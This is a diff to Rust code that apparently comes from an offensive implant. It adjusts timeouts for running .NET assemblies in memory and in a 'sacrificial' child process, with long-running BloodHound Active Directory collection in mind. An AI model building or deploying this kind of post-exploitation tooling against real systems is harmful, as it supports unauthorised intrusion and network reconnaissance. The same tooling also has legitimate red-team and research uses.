@@ -417,7 +417,9 @@ pub fn exec_dotnet(asm_bytes: &[u8], args: &str, child_mode: bool) -> String {
         let ht = CreateThread(ptr::null(), 0, Some(invoke_thread),
             &mut work as *mut _ as _, 0, ptr::null_mut());
         if ht != 0 {
-            WaitForSingleObject(ht, 60_000);
+            // Keep the CLR invocation alive for long-running directory-wide
+            // collectors; the parent process owns the actual bounded timeout.
+            WaitForSingleObject(ht, 900_000);
             CloseHandle(ht);
         }
         if !child_mode { remove_exit_hook(); }
@@ -439,7 +441,7 @@ pub fn exec_dotnet(asm_bytes: &[u8], args: &str, child_mode: bool) -> String {
 
 // ── Fork-and-run: spawn a sacrificial child process to host the CLR ───────────
 
-pub fn fork_run_assembly(asm_bytes: &[u8], args: &str) -> String {
+pub fn fork_run_assembly(asm_bytes: &[u8], args: &str, timeout_sec: u64) -> String {
     unsafe {
         let mut exe = [0u16; MAX_PATH as usize + 1];
         if GetModuleFileNameW(0, exe.as_mut_ptr(), MAX_PATH) == 0 {
@@ -510,20 +512,29 @@ pub fn fork_run_assembly(asm_bytes: &[u8], args: &str) -> String {
             CloseHandle(asm_wr);
         });
 
-        // Read output from child with 60s deadline.
+        // Read output from child with a 60s default. BloodHound can opt into
+        // a bounded longer window through timeout_sec.
         let mut output = Vec::<u8>::new();
         let start_tick = GetTickCount();
+        let timeout_ms: u32 = if (60..=1800).contains(&timeout_sec) {
+            (timeout_sec * 1000) as u32
+        } else {
+            60_000
+        };
         let mut buf = [0u8; 8192];
 
         loop {
-            if GetTickCount().wrapping_sub(start_tick) >= 60_000 {
+            if GetTickCount().wrapping_sub(start_tick) >= timeout_ms {
                 TerminateProcess(pi.h_process, 1);
+                let timeout_note = format!("\n[!] fork-and-run timeout ({}s)", timeout_ms / 1000);
                 if output.is_empty() {
+                    output.extend_from_slice(timeout_note.as_bytes());
                     CloseHandle(out_rd);
                     WaitForSingleObject(pi.h_process, 5000);
                     CloseHandle(pi.h_process); CloseHandle(pi.h_thread);
-                    return "[!] fork-and-run timeout (60s)".into();
+                    return String::from_utf8_lossy(&output).into_owned();
                 }
+                output.extend_from_slice(timeout_note.as_bytes());
                 break;
             }
             let mut avail = 0u32;
